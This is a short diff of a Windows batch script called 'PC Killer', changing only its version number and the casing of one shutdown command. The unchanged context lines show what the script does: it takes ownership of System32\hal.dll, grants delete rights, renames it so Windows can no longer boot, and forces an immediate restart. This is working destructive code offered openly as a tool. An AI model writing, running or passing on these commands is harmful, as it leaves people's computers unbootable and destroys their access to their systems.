@@ -2,7 +2,7 @@
 title PC Killer
 setlocal
 echo Program Name: PC Killer
-echo Version: 1.1.2
+echo Version: 1.1.3
 echo Developer: @YonatanReuvenIsraeli
 echo Website: https://www.yonatanreuvenisraeli.dev
 echo License: GNU General Public License v3.0
@@ -50,7 +50,7 @@ takeown /f "%SystemRoot%\System32\hal.dll"
 icacls "%SystemRoot%\System32\hal.dll" /grant %USERNAME%:(d,wdac)
 ren "%SystemRoot%\System32\hal.dll" "hal1.dll"
 endlocal
-Shutdown /r /t 00
+shutdown /r /t 00
 exit
 
 :Close
